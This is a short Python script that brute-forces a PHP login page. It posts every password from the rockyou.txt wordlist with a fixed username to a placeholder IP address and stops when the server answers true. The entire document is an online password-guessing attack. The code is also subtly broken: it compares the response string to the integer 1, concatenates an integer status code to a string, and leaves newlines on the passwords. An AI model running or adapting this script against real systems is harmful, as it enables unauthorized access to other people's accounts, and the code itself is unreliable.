# SCRIPT FOR POST HTTP URL .PHP RESPONSE 0 OR 1
# 0 = false
# 1 = true
# made by keychange

import requests

with open('/usr/share/wordlists/rockyou.txt') as f:
 for line in f:
  payload='var1=usuario&var2='+line
  r = requests.post('http://X.X.X.X/login.php', data=payload)
  print('[+] PAYLOAD '+payload)
  print('[+] URL '+r.url)
  print('[+] RESPONSE: '+r.text)
  if r.text == 1:
   print('------------------------')
   print('[+] STATUS CODE: '+r.status_code, r.reason)
   print('[+] ===>' + r.text[:300]+'[+]')
   print(line)
   break
  else:
   print('')
